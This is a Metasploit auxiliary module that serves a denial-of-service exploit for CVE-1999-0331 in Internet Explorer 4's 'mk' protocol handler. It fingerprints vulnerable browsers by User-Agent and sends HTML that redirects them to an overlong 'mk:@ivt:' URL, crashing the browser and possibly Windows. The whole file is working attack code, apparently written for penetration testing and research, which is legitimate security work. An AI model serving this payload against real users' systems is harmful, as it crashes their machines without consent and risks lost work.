##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpServer

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Internet Explorer mk Protocol Handler DoS",
      'Description'    => %q{
          This module exploits a vulnerability found in Microsoft Internet Explorer 4 and
        4.01 on Windows 95 OSR1, OSR2, and NT Workstation/Server.
        A heap based buffer overflow in the handling of the 'mk' protocol can lead to remote
        code execution.  However, due to the age of the vulnerability, and the relatively
        rigid offset requirements based on IE version, the bug is simply put as a DoS as
        no one should be using IE4 in 2020+.
        This DoS will also crash the Active Desktop, and potentially Windows itself.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'DilDog', # l0pht
          'h00die', # Metasploit module
        ],
      'References'     =>
        [
          [ 'URL', 'https://insecure.org/sploits/ms.ie.mk.url.html' ],
          [ 'URL', 'http://web.archive.org/web/20000421180102/http://www.microsoft.com/windows/Ie/security/mk.asp' ],
          [ 'URL', 'http://web.archive.org/web/19990427120547/http://l0pht.com/advisories/mkbug401.html' ],
          [ 'CVE', '1999-0331' ]
        ],
      'Platform'       => 'win',
      'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],
      'PassiveActions' => [ 'WebServer' ],
      'DefaultAction'  => 'WebServer',
      'Targets'        =>
        [
          [ 'Automatic', {} ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Jan 14 1998',
      'DefaultTarget'  => 0))
  end

  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    uri   = request.uri

    return unless /MSIE 4\.01?; Windows 95|nt/ =~ agent
    print_good("Vulnerable IE detected: #{agent}")

    print_status('Sending HTML...')
    html = '<html><head></head><body>'
    html << "<script>window.location.replace('mk:@ivt:#{Rex::Text.rand_text_alpha(300)}')</script>"
    html << '</body></html>'
    send_response(cli, html, {'Content-Type'=>'text/html'})
  end

  def run
    exploit # start http server
  end
end
